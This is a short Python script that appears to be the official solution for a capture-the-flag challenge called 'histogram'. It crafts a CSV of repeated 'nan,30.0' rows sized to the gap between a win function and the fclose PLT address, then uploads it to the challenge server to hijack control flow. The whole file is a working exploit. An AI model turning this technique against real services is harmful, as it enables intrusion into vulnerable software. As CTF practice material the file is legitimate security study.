# Official from DC

#!/usr/bin/env python3

import requests
import os

SCHEME = "https"
HOST = "histogram.chal.acsc.asia"
#PORT = os.getenv("PORT", ":8080")

addr_win = 0x401268
addr_fclose_plt = 0x401061
delta = addr_win - addr_fclose_plt

csv = b''
for i in range(delta):
    csv += b"nan,30.0\n"

r = requests.post(f"{SCHEME}://{HOST}/api/histogram", files={
    'csv': ("test.csv", csv, "text/csv")
}, verify=False)
print(r.text)